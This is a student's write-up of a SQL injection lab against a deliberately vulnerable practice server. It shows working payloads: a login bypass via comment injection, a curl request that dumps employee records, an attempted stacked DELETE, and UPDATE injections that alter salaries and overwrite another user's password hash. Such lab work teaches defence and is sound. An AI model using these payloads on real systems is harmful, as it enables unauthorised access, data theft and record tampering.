# SQL Injection Attack Lab

## Task 1: Get Familiar with SQL Statements

To print all the profile information of the employee Alice, we need to select
everything from the table credential, where the column 'Name' is equal to
'Alice'. This can be achieved with the following query:

```sql
SELECT * FROM credential WHERE Name='Alice';
```

![task1_1](task1_1.png)

## Task 2: SQL Injection Attack on SELECT Statement

### Task 2.1: SQL Injection Attack from webpage

To perform this attack, our strategy will be to set the name to admin, and
comment out the rest of the query so that the password never gets checked.
To do this, we enter in the name input field *admin' #*, so the query becomes:

```sql
SELECT id, name, eid, salary, birth, ssn, address, email,
    nickname, Password
FROM credential
WHERE name= 'admin' #' and Password='$hashed_pwd';
```

Which is equivalent to:

```sql
SELECT id, name, eid, salary, birth, ssn, address, email,
    nickname, Password
FROM credential
WHERE name= 'admin';
```

Note: we use *#* instead of the traditional *--* to comment because, according
to the MySQL reference manual, the *--* comment "requires the second dash to be
followed by at least one whitespace or control character". Now lets test this
in the web page.

![task2_1](task2_1.png)

![task2_2](task2_2.png)

### Task 2.2: SQL Injection Attack from command line

Before encoding, the URL of our request should look like this:

```url
http://www.seed-server.com/unsafe_home.php?username=admin'#&Password=
```

For encoding, we just need to replace the *'* character with a %27 and the *#*
with %23. Executing the curl command:

```sh
$ curl http://www.seed-server.com/unsafe_home.php?username=admin%27+%23&Password=´
(...)
<table class='table table-striped table-bordered'><thead class='thead-dark'><tr><th scope='col'>Username</th><th scope='col'>EId</th><th scope='col'>Salary</th><th scope='col'>Birthday</th><th scope='col'>SSN</th><th scope='col'>Nickname</th><th scope='col'>Email</th><th scope='col'>Address</th><th scope='col'>Ph. Number</th></tr></thead><tbody><tr><th scope='row'> Alice</th><td>10000</td><td>20000</td><td>9/20</td><td>10211002</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Boby</th><td>20000</td><td>30000</td><td>4/20</td><td>10213352</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Ryan</th><td>30000</td><td>50000</td><td>4/10</td><td>98993524</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Samy</th><td>40000</td><td>90000</td><td>1/11</td><td>32193525</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Ted</th><td>50000</td><td>110000</td><td>11/3</td><td>32111111</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Admin</th><td>99999</td><td>400000</td><td>3/5</td><td>43254314</td><td></td><td></td><td></td><td></td></tr></tbody></table>
(...)
```

And we get as a response the HTML code, which contains the table with the
employee information.

### Task 2.3: Append a new SQL statement

We tried the following payload:

```sql
admin'; DELETE FROM credential WHERE name="Alice" #
```

![task2_3](task2_3.png)

But we get the following error message:

![task2_3b](task2_3b.png)

After looking at how MySQL queries work in php, we found that query() "sends a
unique query (multiple queries are not supported) to the currently active
database", so that explains why we get an error.

## Task 3: SQL Injection Attack on UPDATE Statement

### Task 3.1: Modify your own salary

To modify the salary, we tried the following payload:

```sql
Alice', salary=1000 WHERE name='Alice' #
```

![task3_1a](task3_1a.png)

And after checking out Alice's profile, we see that we successfuly changed her
salary to 1000.

![task3_1b](task3_1b.png)

### Task 3.2: Modify other people’s salary

To modify other people’s salary, we use a payload similar to the one used in
the last task, but replace the name with "Boby".

```sql
Alice', salary=1 WHERE name='Boby' #
```

![task3_2a](task3_2a.png)

After logging back in the admin's account, we see that salary of Boby is now
set to 1.

![task3_2b](task3_2b.png)

### Task 3.3: Modify other people’ password

We want to change Boby's password to "password123". To do this, we first need
to find the SHA1 hash of this string. We will use an online hasher for this.

![task3_3a](task3_3a.png)

Now, just need to replicate the last payload, but instead of changing the
salary, we must change the password to be equal to
"cbfdac6008f9cab4083784cbd1874f76618d2a97". Here is our payload:

```sql
Alice', password="cbfdac6008f9cab4083784cbd1874f76618d2a97" WHERE name='Boby' #
```

![task3_3b](task3_3b.png)

And sure enough, we are able to login to Boby's account using password123 as
the password.

![task3_3c](task3_3c.png)

![task3_3d](task3_3d.png)
